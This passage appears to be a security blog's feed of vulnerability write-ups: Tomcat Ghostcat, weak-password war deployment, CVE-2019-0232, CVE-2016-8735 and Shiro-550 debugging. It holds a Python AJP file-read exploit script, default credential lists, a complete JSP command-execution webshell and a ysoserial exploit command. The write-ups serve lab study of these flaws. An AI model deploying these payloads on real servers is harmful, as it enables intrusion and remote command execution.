punctuation">.</span>request_headers<span class="token punctuation">[</span><span class="token string">'SC_REQ_AUTHORIZATION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Basic "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"%s:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">for</span> h <span class="token keyword">in</span> headers<span class="token punctuation">:</span>self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">=</span> headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token keyword">for</span> a <span class="token keyword">in</span> attributes<span class="token punctuation">:</span>self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>responses <span class="token operator">=</span> self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>send_and_receive<span class="token punctuation">(</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stream<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>responses<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>snd_hdrs_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No data in response. Headers:%s\n"</span> <span class="token operator">%</span> snd_hdrs_res<span class="token punctuation">.</span>response_headers<span class="token punctuation">)</span><span class="token keyword">return</span> snd_hdrs_res<span class="token punctuation">,</span> data_res<span class="token triple-quoted-string string">'''javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path'''</span><span class="token keyword">import</span> argparseparser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Hostname or IP to attack"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">8009</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"AJP port to attack (default is 8009)"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-f"</span><span class="token punctuation">,</span> <span class="token string">'--file'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'WEB-INF/web.xml'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"file path :(WEB-INF/web.xml)"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>t <span class="token operator">=</span> Tomcat<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span>_<span class="token punctuation">,</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>perform_request<span class="token punctuation">(</span><span class="token string">'/asdf'</span><span class="token punctuation">,</span>attributes<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.request_uri'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.path_info'</span><span class="token punctuation">,</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.servlet_path'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------------------------'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="Tomcat弱口令-war远程部署"><a href="#Tomcat弱口令-war远程部署" class="headerlink" title="Tomcat弱口令&amp;war远程部署"></a>Tomcat弱口令&amp;war远程部署</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令，使用工具对其进行穷举。得到密码后，也可以进行后台上传恶意代码控制服务器。<br><strong>影响范围</strong><br>Tomcat版本：7.0–&gt;8.0</p><p><strong>原理</strong><br>在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台。Tomcat后台提供war包部署功能，实现上传webshell。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>环境：vulhub/tomcat/tomcat<br><img src="/img/24-5-13/3.png"><br>抓包<br><img src="/img/24-5-13/4.png"><br>Authorization头base64解码<br><img src="/img/24-5-13/5.png"><br>用户名：密码  形式再base64编码<br>可用户名密码进行爆破(好像爆破一个用户就会被ban)<br>默认用户名和密码</p><pre class="language-python" data-language="python"><code class="language-python">tomcat<span class="token punctuation">:</span>tomcatboth<span class="token punctuation">:</span>tomcatrole1<span class="token punctuation">:</span>tomcatadmin<span class="token punctuation">:</span>admin<span class="token punctuation">:</span>passwordadmin<span class="token punctuation">:</span>admin</code></pre><p>使用默认tomcat:tomcat登录<br><img src="/img/24-5-13/6.png"></p><p>编写webshell</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.*,java.io.*"</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>HTML<span class="token operator">&gt;</span><span class="token operator">&lt;</span>BODY<span class="token operator">&gt;</span><span class="token operator">&lt;</span>FORM METHOD<span class="token operator">=</span><span class="token string">"GET"</span> NAME<span class="token operator">=</span><span class="token string">"myform"</span> ACTION<span class="token operator">=</span><span class="token string">""</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>INPUT TYPE<span class="token operator">=</span><span class="token string">"text"</span> NAME<span class="token operator">=</span><span class="token string">"cmd"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>INPUT TYPE<span class="token operator">=</span><span class="token string">"submit"</span> VALUE<span class="token operator">=</span><span class="token string">"Send"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>FORM<span class="token operator">&gt;</span><span class="token operator">&lt;</span>pre<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        out<span class="token punctuation">.</span>println<span class="token punctuation">(</span><span class="token string">"Command: "</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;BR&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        OutputStream os <span class="token operator">=</span> p<span class="token punctuation">.</span>getOutputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream <span class="token keyword">in</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DataInputStream dis <span class="token operator">=</span> new DataInputStream<span class="token punctuation">(</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String disr <span class="token operator">=</span> dis<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> disr <span class="token operator">!=</span> null <span class="token punctuation">)</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span>println<span class="token punctuation">(</span>disr<span class="token punctuation">)</span><span class="token punctuation">;</span>                 disr <span class="token operator">=</span> dis<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pre<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>BODY<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>HTML<span class="token operator">&gt;</span>  </code></pre><p>打成war包</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">jar <span class="token operator">-</span>cvf test<span class="token punctuation">.</span>war <span class="token punctuation">.</span></code></pre><img src="/img/24-5-13/7.png">部署成功访问/test/shell.jsp<img src="/img/24-5-13/8.png"><h2 id="RCE-CVE-2019-0232"><a href="#RCE-CVE-2019-0232" class="headerlink" title="RCE (CVE-2019-0232)"></a>RCE (CVE-2019-0232)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>(感觉条件苛刻，利用鸡肋)<br>由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。<br>触发该漏洞需要同时满足以下条件：</p><ol><li>系统为Windows </li><li>启用了CGI Servlet（默认为关闭） </li><li>启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</li></ol><p><strong>影响范围</strong><br>Apache Tomcat 9.0.0.M1 to 9.0.17<br>Apache Tomcat 8.5.0 to 8.5.39<br>Apache Tomcat 7.0.0 to 7.0.93</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.apache.catalina.servlets.CGIServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cgiPathPrefix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>WEB-INF/cgi-bin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>enableCmdLineArguments<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>executable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span></code></pre><p>就将原来的注释去掉，在添加属性<br>这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。</p><p>同样在 conf/web.xml 中启用cgi的servlet-mapping</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/cgi-bin/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span></code></pre><p>之后修改 conf/context.xml 的 <context> 添加 privileged=”true”属性，否则会没有权限</context></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Context</span> <span class="token attr-name">privileged</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span>    <span class="token comment">&lt;!-- web application will be reloaded.                                   --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>WEB-INF/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>WEB-INF/tomcat-web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>${catalina.base}/conf/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span>    <span class="token comment">&lt;!--    &lt;Manager pathname="" /&gt;    --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Context</span><span class="token punctuation">&gt;</span></span></code></pre><p>然后在 ROOT\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。</p><p>配置完成后，启动tomcat，访问 <a href="http://127.0.0.1:8080/cgi-bin/e.bat?&amp;ver">http://127.0.0.1:8080/cgi-bin/e.bat?&amp;ver</a> ，可以看到命令执行成功。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://xz.aliyun.com/t/4875">https://xz.aliyun.com/t/4875?</a></p><h2 id="Tomcat-反序列化漏洞-CVE-2016-8735"><a href="#Tomcat-反序列化漏洞-CVE-2016-8735" class="headerlink" title="Tomcat 反序列化漏洞 (CVE-2016-8735)"></a>Tomcat 反序列化漏洞 (CVE-2016-8735)</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。 该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法。</p><p><strong>条件</strong><br>外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Listener</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.catalina.mbeans.JmxRemoteLifecycleListener<span class="token punctuation">"</span></span> <span class="token attr-name">rmiRegistryPortPlatform</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10001<span class="token punctuation">"</span></span> <span class="token attr-name">rmiServerPortPlatform</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10002<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span></code></pre><p><strong>影响版本</strong><br>Apache Tomcat 9.0.0.M1 to 9.0.0.M11<br>Apache Tomcat 8.5.0 to 8.5.6<br>Apache Tomcat 8.0.0.RC1 to 8.0.38<br>Apache Tomcat 7.0.0 to 7.0.72<br>Apache Tomcat 6.0.0 to 6.0.47</p><p>打RMI:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> ysoserial.jar ysoserial.exploit.RMIRegistryExploit <span class="token number">192.168</span>.0.167 <span class="token number">10001</span> Groovy1 <span class="token string">"calc.exe"</span></code></pre><p>需要Groovy相关依赖<br>（暂无找到分析文章）</p><h2 id="样例目录session操控漏洞"><a href="#样例目录session操控漏洞" class="headerlink" title="样例目录session操控漏洞"></a>样例目录session操控漏洞</h2><p>同一个tomcat下面，两个项目之间ession不能共享。所以”Apache Tomcat示例目录漏洞”对其他项目的威胁不大，但仍建议在部署环境中删除tomcat示例。<br>按照Servlet规范，session的作用范围应该仅仅限于当前应用程序下，不同的应用程序之间是不能够相互访问对方的session的。各个应用服务器从实际效果上都遵守了这一规范，但实现细节却可能不同，因此解决跨应用程序session共享的方法也各不相同。<br>在examples目录下创建一个jsp登录管理的页面，即可实现对session的操控。<br><a href="http://47.104.218.243:8080/login/login.jsp">http://47.104.218.243:8080/login/login.jsp</a></p><h3 id="检测链接"><a href="#检测链接" class="headerlink" title="检测链接"></a>检测链接</h3><p><a href="http://localhost:8080/examples/servlets/servlet/SessionExample">http://localhost:8080/examples/servlets/servlet/SessionExample</a><br>在Name of Session Attribute: 里输入login<br>在Value of Session Attribute:里输入admin</p><p>提交后显示login=admin已经写入session</p><p>然后就可以访问<br><a href="http://localhost:8080/examples/index.jsp">http://localhost:8080/examples/index.jsp</a></p><h2 id="其他漏洞集合"><a href="#其他漏洞集合" class="headerlink" title="其他漏洞集合"></a>其他漏洞集合</h2><p><strong>Tomcat本地提权漏洞(CVE-2016-1240)，Tomcat本地提权漏洞分析与防御。</strong><br>Apache Tomcat 拒绝服务漏洞CVE-2014-0230<br>Apache Tomcat Manager和Host Manager应用程序安全漏洞(CVE-2015-5351)<br>Apache Tomcat session-persistence 远程代码执行漏洞(CVE-2016-0714)<br>Apache Tomcat 会话固定漏洞(CVE-2015-5346)<br>Apache Tomcat 远程代码执行漏洞(CVE-2016-8735)<br>Apache Tomcat Commons Fileupload 拒绝服务漏洞(CVE-2016-3092)<br>Apache Tomcat httpoxy 安全漏洞(CVE-2016-5388)<br>Apache Tomcat 安全绕过漏洞(CVE-2016-6816)<br>Apache Tomcat AJP协议安全绕过漏洞<br>Apache Tomcat 安全绕过漏洞(CVE-2012-3439)<br>Tomcat 拒绝服务漏洞(CVE-2014-0050)<br>Apache Tomcat 安全漏洞(CVE-2017-6056)<br>Apache Tomcat 安全漏洞(CVE-2017-5648)<br>Apache Tomcat Default Servlet 安全漏洞(CVE-2017-5664)<br>Tomcat 信息泄露漏洞(CVE-2017-12616)<br>Apache Tomcat 安全漏洞(CVE-2017-12617)<br>Apache Tomcat 安全漏洞(CVE-2017-5647)<br>Apache Tomcat 安全漏洞(CVE-2018-1304)<br>Apache Tomcat 安全漏洞(CVE-2018-1305)</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web中间件 </tag>
            
            <tag> Tomcat </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro550</title>
      <link href="/2024/05/06/shiro550-md-yyj/"/>
      <url>/2024/05/06/shiro550-md-yyj/</url>
      
        <content type="html"><![CDATA[<h1 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。<br>Apache Shiro基本功能点如下图所示：</p><ul><li><strong>Authentication</strong>：身份认证 / 登录，验证用户是不是拥有相应的身份；</li><li><strong>Authorization</strong>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li><li><strong>Session</strong> <strong>Management</strong>：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；</li><li><strong>Cryptography</strong>：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li><li><strong>Web Support</strong>：Web 支持，可以非常容易的集成到 Web 环境；</li><li><strong>Caching</strong>：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；</li><li><strong>Concurrency</strong>：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li><li><strong>Testing</strong>：提供测试支持；</li><li><strong>Run As</strong>：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li><li><strong>Remember Me</strong>：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了；</li></ul><p>注意，本次的Shiro反序列化漏洞点就是出现在<strong>Remember Me</strong>这个功能模块</p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>shiro源码下载：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>war包地址：<a href="https://github.com/jas502n/SHIRO-550">https://github.com/jas502n/SHIRO-550</a></p><p>/sample/web 模块<br>配置Tomcat<br><img src="/img/5-6/1.png"><br>如果报错添加依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--         JSTL 表达式依赖--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>javax.servlet.jsp.jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jstl-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--        standard--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>taglibs<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>standard<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><img src="/img/5-6/2.png"><h2 id="过程调试"><a href="#过程调试" class="headerlink" title="过程调试"></a>过程调试</h2><p>进入登录页面，勾选RemeberMe进行登录<br>登录成功后，抓包，删除JSSESIONID(优先级较高)，然后调式</p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>入口是在 AbstractRememberMeManager#onSuccessfulLogin 方法<br>这里我们正向分析一下，debug打个断点，然后web登录页面输入root/secret 口令进行提交，再回到IDEA中查看</p><img src="/img/5-6/3.png">继续跟进<img src="/img/5-6/4.png">进入AbstractRememberMeManager#convertPrincipalsToBytes<img src="/img/5-6/5.png">对结果对象序列化为字节数组，然后进行加密进入encrypt，看看怎么加密<img src="/img/5-6/6.png">加密服务cipherService<img src="/img/5-6/7.png">AES-CBC模式加密，秘钥长度128位跟进getEncryptionCipherKey（）<img src="/img/5-6/8.png"><img src="/img/5-6/9.png">继续跟踪在哪里赋值的，查找用法<img src="/img/5-6/10.png">继续查找用法<img src="/img/5-6/11.png">这里加解密秘钥赋值相同，继续查找setCipherKey的用法<img src="/img/5-6/12.png">AbstractRememberMeManager的构造方法理面继续查看常量<img src="/img/5-6/13.png"><pre class="language-java" data-language="java"><code 